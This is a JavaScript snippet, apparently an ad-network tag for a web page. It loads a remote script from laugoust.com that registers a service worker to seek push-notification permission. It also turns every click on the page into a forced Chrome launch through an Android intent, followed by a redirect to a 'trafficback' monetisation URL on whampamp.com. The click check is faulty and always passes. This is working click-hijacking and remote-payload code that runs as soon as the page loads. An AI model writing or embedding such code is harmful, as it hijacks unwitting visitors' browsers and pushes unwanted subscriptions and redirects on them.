    var s = document.createElement('script');
    s.src='//laugoust.com/pfe/current/micro.tag.min.js?z=6860056'+'&sw=/sw-check-permissions-91428.js'+'&nouns=1';
    s.onload = function(result) {
        switch (result) {
            case 'onPermissionDefault':
                console.log('onPermissionDefault');    
                setNewSubdomain();
                break;
            case 'onPermissionAllowed':
                console.log('onPermissionAllowed');    
                break;
            case 'onPermissionDenied':
                console.log('onPermissionDenied');    
                setNewSubdomain();
                break;
            case 'onAlreadySubscribed':
                console.log('onAlreadySubscribed');
                break;
            case 'onNotificationUnsupported':
                console.log('onNotificationUnsupported');
                setNewSubdomain();
                break;
        }
    };
    document.head.appendChild(s);

    
    function isInApp() {
        const regex = new RegExp(`(WebView|(iPhone|iPod|iPad)(?!.*Safari/)|Android.*(wv))`, 'ig');
        return Boolean(this.ua.match(regex));
    }

    function initInappRd() {
        var landingpageURL = window.location.hostname + window.location.pathname + window.location.search;
        var completeRedirectURL = 'intent://' + landingpageURL + '#Intent;scheme=https;package=com.android.chrome;end';
        var trafficbackURL = 'https://whampamp.com/4/6860070/';
        var ua = navigator.userAgent.toLowerCase();

        if (isInApp && (ua.indexOf('fb') !== -1 || ua.indexOf('android') !== -1 || ua.indexOf('wv') !== -1)) {
            document.body.addEventListener('click', function () {
                window.onbeforeunload = null;
                window.open(completeRedirectURL, '_system');
                setTimeout(function () {
                    window.location.replace(trafficbackURL);
                }, 1000);
            });
        }
    }

    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', initInappRd);
    } else {
        initInappRd();
    }
